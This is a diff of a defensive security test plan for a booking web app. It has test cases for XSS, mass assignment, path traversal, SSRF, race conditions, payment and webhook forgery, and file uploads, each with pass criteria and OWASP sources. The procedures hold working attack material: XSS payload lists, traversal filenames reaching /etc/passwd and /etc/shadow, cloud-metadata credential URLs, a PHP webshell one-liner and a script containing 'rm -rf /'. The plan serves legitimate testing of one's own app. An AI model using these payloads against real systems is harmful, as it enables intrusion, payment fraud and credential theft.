+# (DevTools → Network tab → filter by domain)
 ```
+
+**Pass criteria:**
+- API response shows HTML-encoded output: `&lt;script&gt;` not `<script>`.
+- No alert dialog appears in the browser.
+- No request to `attacker.example.com` in the network tab.
+
+**Sources:** [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), CWE-79, [PortSwigger XSS labs](https://portswigger.net/web-security/cross-site-scripting)
 
 ---
 
-### 4.3 Reflected XSS
+### TEST-INPUT-03 — Reflected XSS
 
-Navigate to:
+**CWE:** CWE-79  
+**Tools:** Browser, Burp Suite  
+**Risk:** User-controlled input rendered directly in the page allows one-click attacks via crafted URLs.
+
+**Procedure:**
+```bash
+# Test search parameter
+PAYLOADS=(
+  "<script>alert(1)</script>"
+  '"><script>alert(document.domain)</script>'
+  "<img src=x onerror=alert(1)>"
+  "javascript:alert(1)"
+  "<svg/onload=alert(1)>"
+)
+
+for PAYLOAD in "${PAYLOADS[@]}"; do
+  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
+  echo "Testing: $PAYLOAD"
+  curl -s "https://your-frontend.com/search?q=$ENCODED" | grep -i "$PAYLOAD" && echo "REFLECTED" || echo "encoded/blocked"
+done
+```
+
+**Browser test:**
+Navigate to these URLs and check whether a dialog appears or the payload appears unencoded in source:
 ```
 https://your-frontend.com/search?q=<img+src=x+onerror=alert(document.domain)>
 https://your-frontend.com/search?q="><script>alert(1)</script>
 ```
-**Pass criteria:** Input is HTML-encoded. No script executes.
+
+**Sources:** [OWASP WSTG-INPV-01](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting), CWE-79
 
 ---
 
-### 4.4 Mass Assignment
+### TEST-INPUT-04 — Mass Assignment
 
+**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)  
+**Tools:** curl  
+**Risk:** If the backend passes request data directly to a model constructor without field allowlisting, a user can set privileged fields like `is_staff`, `role`, or `status`.
+
+**Procedure:**
 ```bash
-# Attempt to set privileged fields during registration
-curl -X POST https://your-backend.com/api/auth/register/ \
+# Test 1 — Self-escalate during registration
+curl -v -X POST https://your-backend.com/api/auth/register/ \
   -H "Content-Type: application/json" \
   -d '{
     "username": "attacker",
     "email": "attacker@example.com",
-    "password": "password123",
+    "password": "Attacker123!",
     "is_staff": true,
     "is_admin": true,
-    "role": "admin"
+    "role": "admin",
+    "isHost": true
   }'
 
-# Then log in and check if the account has elevated privileges
-curl -H "Authorization: Bearer <attacker_token>" \
-  https://your-backend.com/api/admin/dashboard/
+# Capture the new user's token and check privileges
+NEW_TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attacker@example.com","password":"Attacker123!"}' \
+  | jq -r '.access')
 
-# Pass: Registration succeeds as a regular user; admin endpoint returns 403
+curl -s -H "Authorization: Bearer $NEW_TOKEN" \
+  https://your-backend.com/api/auth/me/ | jq '{is_staff,is_admin,role,isHost}'
+
+# Test 2 — Self-promote via profile update
+curl -X PATCH https://your-backend.com/api/auth/me/ \
+  -H "Authorization: Bearer $NEW_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"is_staff":true,"role":"admin","isHost":true}'
+
+curl -s -H "Authorization: Bearer $NEW_TOKEN" \
+  https://your-backend.com/api/auth/me/ | jq '{is_staff,role,isHost}'
+
+# Pass: Privileged fields are unchanged; all return default values
 ```
+
+**Sources:** [Rails Mass Assignment reference](https://guides.rubyonrails.org/security.html#mass-assignment), [OWASP API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/), CWE-915
 
 ---
 
-### 4.5 Path Traversal
+### TEST-INPUT-05 — Path Traversal
 
+**CWE:** CWE-22 (Path Traversal)  
+**Tools:** curl  
+**Risk:** Attacker-controlled filenames in upload endpoints can write or read files outside the intended directory.
+
+**Procedure:**
 ```bash
-# Attempt path traversal in a listing image filename
-curl -X POST https://your-backend.com/api/listings/1/images/ \
-  -H "Authorization: Bearer <host_token>" \
-  -F "image=@/dev/urandom;filename=../../etc/passwd;type=image/jpeg"
+HOST_TOKEN="<host token>"
+LISTING_ID="1"
 
-# Pass: 400 Bad Request — filename rejected or sanitized
+TRAVERSAL_NAMES=(
+  "../../etc/passwd"
+  "../../../tmp/malicious"
+  "....//....//etc/passwd"
+  "%2e%2e%2fetc%2fpasswd"
+  "..%252f..%252fetc%252fpasswd"
+)
+
+for NAME in "${TRAVERSAL_NAMES[@]}"; do
+  echo "Testing filename: $NAME"
+  curl -o /dev/null -w "HTTP %{http_code}\n" \
+    -X POST "https://your-backend.com/api/listings/$LISTING_ID/images/" \
+    -H "Authorization: Bearer $HOST_TOKEN" \
+    -F "image=@valid_image.jpg;filename=$NAME"
+done
+
+# Also test via JSON if the API accepts URLs
+curl -X POST "https://your-backend.com/api/listings/$LISTING_ID/" \
+  -H "Authorization: Bearer $HOST_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"image_filename": "../../etc/cron.d/backdoor"}'
+
+# Pass: All return 400 Bad Request; uploaded files stored under a generated UUID name
 ```
+
+**Sources:** [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal), CWE-22
 
 ---
 
-### 4.6 SSRF (Server-Side Request Forgery)
+### TEST-INPUT-06 — SSRF (Server-Side Request Forgery)
 
-If any endpoint accepts a URL (e.g., image URLs, webhook URLs):
+**CWE:** CWE-918  
+**Tools:** curl, Burp Collaborator (Pro) or https://webhook.site (free)  
+**Risk:** If an endpoint accepts URLs, an attacker can make the server fetch internal resources — cloud metadata, internal APIs, or scan the internal network.
+
+**Procedure:**
 ```bash
-# Internal metadata service (AWS/GCP/Azure)
-curl -X POST https://your-backend.com/api/listings/ \
-  -H "Authorization: Bearer <host_token>" \
-  -d '{"external_image_url": "http://169.254.169.254/latest/meta-data/"}'
+HOST_TOKEN="<host token>"
 
-# Internal network scan
-curl -X POST https://your-backend.com/api/listings/ \
-  -d '{"external_image_url": "http://localhost:5432"}'
+# Set up an out-of-band receiver (use https://webhook.site and copy your unique URL)
+RECEIVER="https://webhook.site/your-unique-id"
 
-# Pass: Request blocked or URL rejected — internal/private IP ranges forbidden
+# Test 1 — Cloud metadata (AWS IMDSv1 — most commonly exploited)
+SSRF_TARGETS=(
+  "http://169.254.169.254/latest/meta-data/"
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  "http://metadata.google.internal/computeMetadata/v1/"
+  "http://100.100.100.200/latest/meta-data/"  # Alibaba Cloud
+  "http://localhost:5432"                      # Database
+  "http://localhost:6379"                      # Redis
+  "http://localhost:9200"                      # Elasticsearch
+  "$RECEIVER"                                  # Out-of-band detection
+)
+
+for URL in "${SSRF_TARGETS[@]}"; do
+  echo "Testing: $URL"
+  curl -s -X POST "https://your-backend.com/api/listings/" \
+    -H "Authorization: Bearer $HOST_TOKEN" \
+    -H "Content-Type: application/json" \
+    -d "{\"external_image_url\": \"$URL\"}" \
+    | jq '{error,detail}'
+done
+
+# Check webhook.site — if a request arrives from your server, SSRF is confirmed
 ```
+
+**Pass criteria:** All requests return 400. No request arrives at `webhook.site`. Internal IP ranges (`127.x.x.x`, `10.x.x.x`, `169.254.x.x`, `172.16–31.x.x`, `192.168.x.x`) are blocked by the application.
+
+**Sources:** [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html), CWE-918, [PortSwigger SSRF labs](https://portswigger.net/web-security/ssrf)
 
 ---
 
-### 4.7 Invalid / Edge Case Inputs
+### TEST-INPUT-07 — Edge Case / Boundary Inputs
 
+**CWE:** CWE-20 (Improper Input Validation)  
+**Tools:** curl  
+
+**Procedure:**
 ```bash
+TOKEN="<guest token>"
+BASE_BOOKING="https://your-backend.com/api/bookings/"
+
 # Negative guest count
-curl -X POST https://your-backend.com/api/bookings/ \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"listing":1,"guests":-1,"start_date":"2026-06-01","end_date":"2026-06-05"}'
-# Pass: 400 Validation error
+curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"listing":1,"guests":-1,"start_date":"2026-07-01","end_date":"2026-07-05"}' \
+  | jq .
+
+# Zero guests
+curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"listing":1,"guests":0,"start_date":"2026-07-01","end_date":"2026-07-05"}' \
+  | jq .
 
 # End date before start date
-curl -X POST https://your-backend.com/api/bookings/ \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"listing":1,"start_date":"2026-06-10","end_date":"2026-06-01"}'
-# Pass: 400 — end date must be after start date
+curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"listing":1,"guests":2,"start_date":"2026-07-10","end_date":"2026-07-01"}' \
+  | jq .
 
-# Guests exceeding property capacity
-curl -X POST https://your-backend.com/api/bookings/ \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"listing":1,"guests":999,"start_date":"2026-06-01","end_date":"2026-06-05"}'
-# Pass: 400 — exceeds maximum occupancy
+# Integer overflow
+curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"listing":1,"guests":9223372036854775807,"start_date":"2026-07-01","end_date":"2026-07-05"}' \
+  | jq .
 
-# Integer overflow / very large numbers
-curl -X POST https://your-backend.com/api/bookings/ \
-  -H "Authorization: Bearer $TOKEN" \
-  -d '{"listing":1,"guests":9999999999,"start_date":"2026-06-01","end_date":"2026-06-05"}'
-# Pass: 400 or clamped to valid range
+# Malformed JSON
+curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d 'NOT_JSON' | jq .
+
+# Empty required fields
+curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{}' | jq .
+
+# All must return HTTP 400 with a descriptive validation error, never HTTP 500
 ```
 
 ---
 
 ## 5. Business Logic
 
-### 5.1 Double Booking (Race Condition)
+---
 
+### TEST-BIZ-01 — Double Booking Race Condition
+
+**CWE:** CWE-362 (Race Condition)  
+**Tools:** curl (parallel), ab (Apache Bench), Python  
+**Risk:** Without database-level locking, two simultaneous booking requests for the same room can both succeed, creating an overbooked property.
+
+**Procedure (curl parallel):**
 ```bash
-# Send two simultaneous booking requests for the same room and dates
-curl -s -X POST https://your-backend.com/api/bookings/ \
-  -H "Authorization: Bearer <user_a_token>" \
-  -H "Content-Type: application/json" \
-  -d '{"listing":1,"hotel_room":5,"start_date":"2026-07-01","end_date":"2026-07-05","guests":2}' &
+TOKEN_A="<user a token>"
+TOKEN_B="<user b token>"
+LISTING_ID="1"
+ROOM_ID="5"  # A hotel room with total_count=1
 
-curl -s -X POST https://your-backend.com/api/bookings/ \
-  -H "Authorization: Bearer <user_b_token>" \
-  -H "Content-Type: application/json" \
-  -d '{"listing":1,"hotel_room":5,"start_date":"2026-07-01","end_date":"2026-07-05","guests":2}' &
+PAYLOAD="{\"listing\":$LISTING_ID,\"hotel_room\":$ROOM_ID,\"start_date\":\"2026-09-01\",\"end_date\":\"2026-09-05\",\"guests\":2}"
+
+# Fire both requests simultaneously
+(
+  curl -s -o /tmp/result_a.json -w "%{http_code}" \
+    -X POST https://your-backend.com/api/bookings/ \
+    -H "Authorization: Bearer $TOKEN_A" \
+    -H "Content-Type: application/json" \
+    -d "$PAYLOAD" > /tmp/code_a.txt
+) &
+
+(
+  curl -s -o /tmp/result_b.json -w "%{http_code}" \
+    -X POST https://your-backend.com/api/bookings/ \
+    -H "Authorization: Bearer $TOKEN_B" \
+    -H "Content-Type: application/json" \
+    -d "$PAYLOAD" > /tmp/code_b.txt
+) &
 
 wait
-
-# Pass: Exactly one booking succeeds (HTTP 201); the other returns a 400 availability error.
-# The database must use SELECT FOR UPDATE or atomic transactions to prevent the race.
+echo "User A: HTTP $(cat /tmp/code_a.txt)"
+echo "User B: HTTP $(cat /tmp/code_b.txt)"
+cat /tmp/result_a.json | jq .status
+cat /tmp/result_b.json | jq .status
 ```
+
+**Procedure (Python threaded — more reliable for race conditions):**
+```python
+import threading, requests, json
+
+URL = "https://your-backend.com/api/bookings/"
+PAYLOAD = {
+    "listing": 1, "hotel_room": 5,
+    "start_date": "2026-09-01", "end_date": "2026-09-05", "guests": 2
+}
+TOKENS = ["<token_a>", "<token_b>", "<token_c>"]
+results = []
+
+def book(token):
+    r = requests.post(URL, json=PAYLOAD,
+                      headers={"Authorization": f"Bearer {token}"})
+    results.append((r.status_code, r.json()))
+
+threads = [threading.Thread(target=book, args=(t,)) for t in TOKENS]
+[t.start() for t in threads]
+[t.join() for t in threads]
+
+for code, body in results:
+    print(f"HTTP {code}: {body.get('status','—')} / {body.get('error','—')}")
+
+# Pass: Exactly one HTTP 201; all others HTTP 400 with "not available"
+```
+
+**Sources:** [OWASP Race Conditions](https://owasp.org/www-community/attacks/Race_condition), CWE-362
 
 ---
 
-### 5.2 Price Manipulation
+### TEST-BIZ-02 — Price Manipulation
 
+**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)  
+**Tools:** curl, Burp Suite Proxy  
+**Risk:** If the server trusts the client-submitted price, a guest can book a $500/night property for $1.
+
+**Procedure:**
 ```bash
-# Submit a booking with a tampered price
-curl -X POST https://your-backend.com/api/bookings/ \
+TOKEN="<guest token>"
+
+# Test 1 — Submit a tampered total_price in the booking POST
+curl -s -X POST https://your-backend.com/api/bookings/ \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
     "listing": 1,
-    "start_date": "2026-06-01",
-    "end_date": "2026-06-05",
+    "start_date": "2026-07-01",
+    "end_date": "2026-07-05",
+    "guests": 2,
     "total_price": 1,
-    "base_price": 0.01
-  }'
+    "base_price": 0.01,
+    "service_fee": 0
+  }' | jq '{id, total_price, base_price}'
 
-# Pass: Server recomputes price from listing data; booking is rejected or created with the
-# correct server-calculated price — never the client-supplied price.
+# If a booking was created, check what price was stored:
+# Pass: Stored price matches the listing's published rate, not the submitted value.
+
+# Test 2 — Intercept with Burp Suite
+# 1. Start booking flow in the browser with Burp proxy intercepting
+# 2. On the payment-intent creation request, modify amount_cents from 50000 to 1
+# 3. Forward the modified request
+# 4. Check Stripe Dashboard — the actual charge should be the correct amount
 ```
+
+**Sources:** [OWASP Business Logic](https://owasp.org/www-community/attacks/Business_logic_vulnerability), CWE-345
 
 ---
 
-### 5.3 Booking Status Manipulation
+### TEST-BIZ-03 — Review Without a Booking
 
+**CWE:** CWE-285  
+**Tools:** curl  
+
+**Procedure:**
 ```bash
-# Guest attempts to directly mark their booking as "confirmed" (bypassing host approval)
-curl -X PATCH \
-  -H "Authorization: Bearer <guest_token>" \
+# Use a user account that has NO completed bookings for listing ID 99
+NO_BOOKING_TOKEN="<token of user with no bookings>"
+
+curl -s -X POST https://your-backend.com/api/listings/99/reviews/ \
+  -H "Authorization: Bearer $NO_BOOKING_TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{"status":"confirmed"}' \
-  https://your-backend.com/api/bookings/<booking_id>/
+  -d '{"rating":5,"comment":"Paid review — no stay required!"}' \
+  | jq .
 
-# Pass: 403 Forbidden — status transitions are enforced server-side.
-# Only the host (confirm/decline) and admins can change booking status.
-```
-
----
-
-### 5.4 Listing Status Manipulation
-
-```bash
-# Host attempts to publish their own listing (bypassing admin review)
-curl -X PATCH \
-  -H "Authorization: Bearer <host_token>" \
-  -H "Content-Type: application/json" \
-  -d '{"status":"published"}' \
-  https://your-backend.com/api/listings/<listing_id>/
-
-# Pass: 403 Forbidden or field silently ignored — only admins may publish listings.
-```
-
----
-
-### 5.5 Review Without a Booking
-
-```bash
-# Attempt to leave a review for a property the user has never booked
-curl -X POST https://your-backend.com/api/listings/1/reviews/ \
-  -H "Authorization: Bearer <user_with_no_booking_token>" \
-  -H "Content-Type: application/json" \
-  -d '{"rating":5,"comment":"Free 5-star!"}'
-
-# Pass: 403 or 400 — reviews require a completed stay
+# Expected: HTTP 403 {"error": "You can only review properties you have stayed at."}
 ```
 
 ---
 
 ## 6. Payment Security
 
-### 6.1 No Raw Card Data on Server
-
-1. DevTools → Network tab.
-2. Complete a real payment flow.
-3. Filter requests to your backend domain.
-4. Search for: `card_number`, `cardNumber`, `cvv`, `cvc`, `expiry`, `exp_month`, `exp_year`.
-
-**Pass criteria:** None of these fields appear in any request to your backend. They travel only to `api.stripe.com`.
-
 ---
 
-### 6.2 Payment Amount Computed Server-Side
+### TEST-PAY-01 — No Raw Card Data on Server
+
+**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)  
+**Tools:** Browser DevTools  
+**Risk:** Sending raw card numbers to your backend is a PCI DSS violation and exposes cardholder data.
+
+**Procedure:**
+1. Open DevTools → Network tab → click the filter icon → type your backend domain.
+2. Complete a payment in the UI.
+3. After the payment, right-click in the Network tab → "Save all as HAR with content".
+4. Search the HAR file for: `card_number`, `cardNumber`, `cvv`, `cvc`, `expiry`, `exp_month`, `exp_year`, `pan`.
 
 ```bash
-# Intercept the payment-intent creation request and modify the amount
-# (Use Burp Suite or browser DevTools to change amount_cents before it's sent)
-
-# Then check the Stripe Dashboard — does the actual charge match the tampered amount?
-
-# Pass: Server recomputes amount_cents from the booking's stored prices.
-# The client-submitted amount is ignored.
+# Automated HAR search (save HAR file first from DevTools)
+grep -Ei "card_number|cardnumber|cvv|cvc|expiry|exp_month|pan" network-traffic.har
 ```
 
+5. Also confirm that Stripe's tokenized card appears only in requests to `api.stripe.com`, not to your backend.
+
+**Pass criteria:** Zero matches. All card data goes exclusively to `api.stripe.com`.
+
+**Sources:** [PCI DSS Requirements](https://www.pcisecuritystandards.org/document_library/), [Stripe Security Guide](https://stripe.com/docs/security)
+
 ---
 
-### 6.3 Payment Intent Replay
+### TEST-PAY-02 — Payment Amount Computed Server-Side
+
+**CWE:** CWE-345  
+**Tools:** Burp Suite Proxy, curl  
+**Risk:** If the Stripe PaymentIntent amount is taken from the client request, an attacker pays $0.01 for a $500 booking.
+
+**Procedure (Burp Suite intercept):**
+1. Enable Burp proxy. Begin a booking in the browser.
+2. When the browser sends `POST /api/payments/stripe/payment-intent/`, intercept the request.
+3. Modify `amount_cents` from the real value (e.g., `50000`) to `1`.
+4. Forward the modified request.
+5. Complete the Stripe Elements form and submit.
+6. Check the Stripe Dashboard → Payments → confirm the actual charge amount.
 
 ```bash
-# Capture a valid payment_intent_id from a completed booking
-INTENT_ID="pi_xxxxxxxxxxxxxxxxxxxxxxxx"
-
-# Attempt to confirm it again
-curl -X POST https://your-backend.com/api/payments/confirm/ \
+# Direct test — forge a payment-intent request with amount=1
+curl -s -X POST https://your-backend.com/api/payments/stripe/payment-intent/ \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  -d "{\"payment_intent_id\": \"$INTENT_ID\"}"
+  -d '{"booking_id":"<booking_id>","amount_cents":1,"currency":"usd"}' \
+  | jq .
 
-# Pass: 400 or 409 — payment intent already consumed; no duplicate booking created
+# If the response contains a client_secret for a $0.01 intent, the test FAILS.
+# Pass: Server returns an intent for the correct amount regardless of the submitted amount.
 ```
+
+**Sources:** [Stripe PaymentIntent docs](https://stripe.com/docs/api/payment_intents), CWE-345
 
 ---
 
-### 6.4 Webhook Signature Verification
+### TEST-PAY-03 — Webhook Signature Verification
 
+**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)  
+**Tools:** curl, openssl  
+**Risk:** If webhook payloads are accepted without verifying the Stripe-Signature header, anyone can POST a fake `payment_intent.succeeded` event to mark a booking as paid without actually paying.
+
+**Procedure:**
 ```bash
-# Attempt to send a fake payment success event without the Stripe signature
-curl -X POST https://your-backend.com/api/payments/webhook/ \
+WEBHOOK_URL="https://your-backend.com/api/payments/webhook/"
+
+# Test 1 — No signature header
+curl -s -o /dev/null -w "No signature: %{http_code}\n" \
+  -X POST "$WEBHOOK_URL" \
   -H "Content-Type: application/json" \
-  -d '{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":100}}}'
+  -d '{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":10000}}}'
 
-# Pass: 400 or 401 — "Invalid signature"
-
-# Attempt with a tampered payload (valid signature on different payload)
-PAYLOAD='{"type":"payment_intent.succeeded","amount":100}'
-SIG=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "your-webhook-secret" | cut -d' ' -f2)
-TAMPERED='{"type":"payment_intent.succeeded","amount":999999}'
-
-curl -X POST https://your-backend.com/api/payments/webhook/ \
+# Test 2 — Wrong signature
+curl -s -o /dev/null -w "Wrong signature: %{http_code}\n" \
+  -X POST "$WEBHOOK_URL" \
   -H "Content-Type: application/json" \
-  -H "Stripe-Signature: t=1234,v1=$SIG" \
+  -H "Stripe-Signature: t=1234567890,v1=fakesignature" \
+  -d '{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":10000}}}'
+
+# Test 3 — Valid signature on a TAMPERED payload
+PAYLOAD='{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_real","amount":100}}}'
+TIMESTAMP=$(date +%s)
+SECRET="whsec_your_webhook_secret_here"
+SIGNED_PAYLOAD="${TIMESTAMP}.${PAYLOAD}"
+SIG=$(echo -n "$SIGNED_PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" | awk '{print $2}')
+
+TAMPERED='{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_real","amount":999999}}}'
+curl -s -o /dev/null -w "Tampered payload: %{http_code}\n" \
+  -X POST "$WEBHOOK_URL" \
+  -H "Content-Type: application/json" \
+  -H "Stripe-Signature: t=${TIMESTAMP},v1=${SIG}" \
   -d "$TAMPERED"
 
-# Pass: 400 or 401 — signature mismatch detected
+# All three must return: HTTP 400 or 401
+```
+
+**Sources:** [Stripe webhook security docs](https://stripe.com/docs/webhooks/signatures), CWE-345
+
+---
+
+### TEST-PAY-04 — Payment Replay Attack
+
+**CWE:** CWE-294 (Authentication Bypass by Capture-replay)  
+**Tools:** curl  
+**Risk:** If a completed PaymentIntent can be re-submitted to the confirmation endpoint, an attacker could create multiple bookings from a single payment.
+
+**Procedure:**
+```bash
+TOKEN="<guest token>"
+
+# Step 1 — Complete a real booking (obtain a payment_intent_id from Stripe)
+INTENT_ID="pi_xxxxxxxxxxxxxxxxxxxxxxxx"
+
+# Step 2 — Replay the confirmation to create a second booking
+curl -s -X POST https://your-backend.com/api/payments/confirm/ \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d "{\"payment_intent_id\":\"$INTENT_ID\",\"booking_id\":\"<new_booking_id>\"}" \
+  | jq .
+
+# Expected: HTTP 400 or 409 — "PaymentIntent already used" or "booking already confirmed"
 ```
 
 ---
 
-### 6.5 Skip Payment Step
+### TEST-PAY-05 — Skip Payment Step
 
+**CWE:** CWE-285  
+**Tools:** curl  
+**Risk:** A POST directly to the booking endpoint with a forged `payment_status` field could create a confirmed booking without payment.
+
+**Procedure:**
 ```bash
-# POST directly to booking confirmation without completing Stripe payment
-curl -X POST https://your-backend.com/api/bookings/ \
+TOKEN="<guest token>"
+
+curl -s -X POST https://your-backend.com/api/bookings/ \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{"listing":1,"start_date":"2026-06-01","end_date":"2026-06-05","payment_status":"paid"}'
+  -d '{
+    "listing": 1,
+    "start_date": "2026-07-01",
+    "end_date": "2026-07-05",
+    "guests": 2,
+    "status": "confirmed",
+    "payment_status": "paid",
+    "stripe_payment_intent_id": "pi_fake"
+  }' | jq '{id, status, payment_status}'
 
-# Pass: Booking is created in "requested" state, NOT "confirmed".
-# Payment_status from client is ignored; only the Stripe webhook may mark a booking paid.
+# Pass: Booking is created with status="requested" and payment_status="pending".
+# Only the Stripe webhook handler may change payment_status to "paid".
 ```
 
 ---
 
 ## 7. File Upload Security
 
-### 7.1 Malicious File Type
+---
 
+### TEST-FILE-01 — Malicious File Type
+
+**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)  
+**Tools:** curl  
+**Risk:** Uploading executable or script files to a storage server can lead to remote code execution if those files are served and interpreted.
+
+**Procedure:**
 ```bash
-# Create a PHP webshell disguised as an image
+HOST_TOKEN="<host token>"
+ENDPOINT="https://your-backend.com/api/listings/1/images/"
+
+# Create test files
 echo '<?php system($_GET["cmd"]); ?>' > webshell.php
+echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>' > xss.svg
+echo '#!/bin/bash\nrm -rf /' > malicious.sh
+cp /bin/ls binary.exe  # rename a binary as jpg
 
-curl -X POST https://your-backend.com/api/listings/1/images/ \
-  -H "Authorization: Bearer <host_token>" \
-  -F "image=@webshell.php;type=image/jpeg"
+# Test each dangerous type
+for FILE in webshell.php xss.svg malicious.sh binary.exe; do
+  echo -n "Uploading $FILE: "
+  curl -s -o /dev/null -w "HTTP %{http_code}\n" \
+    -X POST "$ENDPOINT" \
+    -H "Authorization: Bearer $HOST_TOKEN" \
+    -F "image=@$FILE;type=image/jpeg"
+done
 
-# Pass: 400 Bad Request — server validates MIME type by reading file bytes, not just extension or Content-Type header.
+# Test Content-Type spoofing with a real image extension but bad content
+echo '<?php system($_GET["cmd"]); ?>' > malicious.jpg
+echo -n "Uploading malicious.jpg (PHP content): "
+curl -s -o /dev/null -w "HTTP %{http_code}\n" \
+  -X POST "$ENDPOINT" \
+  -H "Authorization: Bearer $HOST_TOKEN" \
+  -F "image=@malicious.jpg;type=image/jpeg"
+
+# All must return: HTTP 400 Bad Request
+# Server must check file content (magic bytes), not just extension or Content-Type
 ```
 
+**How to verify server checks magic bytes (not just extension):**
+In Django, the upload handler should use `python-magic` or `filetype` library:
+```python
+import magic
+mime = magic.from_buffer(file.read(2048), mime=True)
+assert mime in ('image/jpeg', 'image/png', 'image/webp', 'image/gif')
+```
+
+**Sources:** [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html), CWE-434
+
+---
+
+### TEST-FILE-02 — Oversized File
+
+**CWE:** CWE-400 (Uncontrolled Resource Consumption)  
+**Tools:** curl, dd  
+
+**Procedure:**
 ```bash
-# SVG with embedded JavaScript (XSS vector)
-echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > xss.svg
+# Generate test files of increasing size
+dd if=/dev/urandom of=file_5mb.bin bs=1M count=5
+dd if=/dev/urandom of=file_11mb.bin bs=1M count=11  # assume 10MB limit
+dd if=/dev/urandom of=file_50mb.bin bs=1M count=50
 
-curl -X POST https://your-backend.com/api/listings/1/images/ \
-  -H "Authorization: Bearer <host_token>" \
-  -F "image=@xss.svg;type=image/svg+xml"
+for FILE in file_5mb.bin file_11mb.bin file_50mb.bin; do
+  SIZE=$(du -h "$FILE" | cut -f1)
+  echo -n "Uploading $SIZE: "
+  curl -s -o /dev/null -w "HTTP %{http_code}\n" \
+    -X POST https://your-backend.com/api/listings/1/images/ \
+    -H "Authorization: Bearer $HOST_TOKEN" \
+    -F "image=@$FILE;type=image/jpeg"
+done
 
-# Pass: 400 or SVG content sanitized before storage/serving
+# Pass: Files over the limit return HTTP 400 or 413.
+# The server must enforce the limit in Django settings: FILE_UPLOAD_MAX_MEMORY_SIZE and DATA_UPLOAD_MAX_MEMORY_SIZE.
 ```
 
 ---
 
-### 7.2 Oversized File
+### TEST-FILE-03 — Filename Path Traversal
 
+**CWE:** CWE-22  
+**Tools:** curl  
+
+**Procedure:**
 ```bash
-# Generate a 25MB file (assuming 10MB limit)
-dd if=/dev/urandom of=large.bin bs=1M count=25
+TRAVERSAL_FILENAMES=(
+  "../../etc/passwd"
+  "../../../tmp/evil"
+  "....//....//etc/shadow"
+  "%2e%2e%2fetc%2fpasswd"
+  "..%252f..%252fetc%252fpasswd"
+  "..\\..\\windows\\system32\\config\\SAM"
+)
 
-curl -X POST https://your-backend.com/api/listings/1/images/ \
-  -H "Authorization: Bearer <host_token>" \
-  -F "image=@large.bin;type=image/jpeg"
+for NAME in "${TRAVERSAL_FILENAMES[@]}"; do
+  echo -n "Filename [$NAME]: "
+  curl -s -o /tmp/upload_resp.json -w "HTTP %{http_code}\n" \
+    -X POST https://your-backend.com/api/listings/1/images/ \
+    -H "Authorization: Bearer $HOST_TOKEN" \
+    -F "image=@valid_image.jpg;filename=$NAME"
+  cat /tmp/upload_resp.json | jq .error 2>/dev/null
+done
 
-# Pass: 400 or 413 — file too large
-```
-
----
-
-### 7.3 Filename Path Traversal
-
-```bash
-curl -X POST https://your-backend.com/api/listings/1/images/ \
-  -H "Authorization: Bearer <host_token>" \
-  -F $'image=@valid.jpg;filename=../../etc/passwd'
-
-# Pass: 400 Bad Request or filename sanitized (stored with a safe generated name, not the client-supplied name)
-```
-
----
-
-### 7.4 Stored File Accessible Without Auth
-
-```bash
-# Get the URL of an uploaded image for a private listing (e.g., a pending_review listing)
-FILE_URL="https://your-storage.com/listings/1/private-image.jpg"
-
-# Access it without any authorization header
-curl -I "$FILE_URL"
-
-# Pass: 403 if the file should be private; or acceptable if files are served publicly (CDN images).
-# Document the expected behavior.
+# Also verify that stored files use generated names (UUID), never the client-supplied name
 ```
 
 ---
 
 ## 8. Data Exposure & Information Leakage
 
-### 8.1 API Response — PII Over-Exposure
+---
 
+### TEST-DATA-01 — API Over-Exposure of PII
+
